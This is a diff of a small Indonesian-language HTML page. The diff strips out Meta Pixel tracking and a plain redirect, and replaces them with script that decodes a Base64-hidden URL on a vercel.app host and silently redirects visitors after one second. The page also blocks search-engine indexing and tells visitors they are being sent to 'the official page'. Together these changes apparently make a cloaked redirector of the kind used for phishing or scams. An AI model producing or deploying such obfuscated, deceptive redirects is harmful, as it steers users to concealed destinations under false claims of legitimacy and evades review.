@@ -1,32 +1,23 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
-
-  <!-- Meta Pixel Code -->
+  <title>Memuat Halaman...</title>
+  <meta name="robots" content="noindex, nofollow">
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+  </style>
   <script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '843579227926138');
-  fbq('track', 'PageView');
+    setTimeout(function () {
+      const encoded = "aHR0cHM6Ly93c3MtYW1iZXIudmVyY2VsLmFwcC8="; // Base64 加密后的目标链接
+      const url = atob(encoded);
+      window.location.href = url;
+    }, 1000); // 延迟 1 秒自动跳转
   </script>
-  <noscript>
-    <img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=843579227926138&ev=PageView&noscript=1"/>
-  </noscript>
-  <!-- End Meta Pixel Code -->
-
-  <!-- 自动跳转 -->
-  <meta http-equiv="refresh" content="0;url=https://wss-amber.vercel.app/" />
 </head>
 <body>
+  <h2>Sedang memuat...</h2>
+  <p>Mohon tunggu, sedang diarahkan ke halaman resmi.</p>
 </body>
 </html>
+
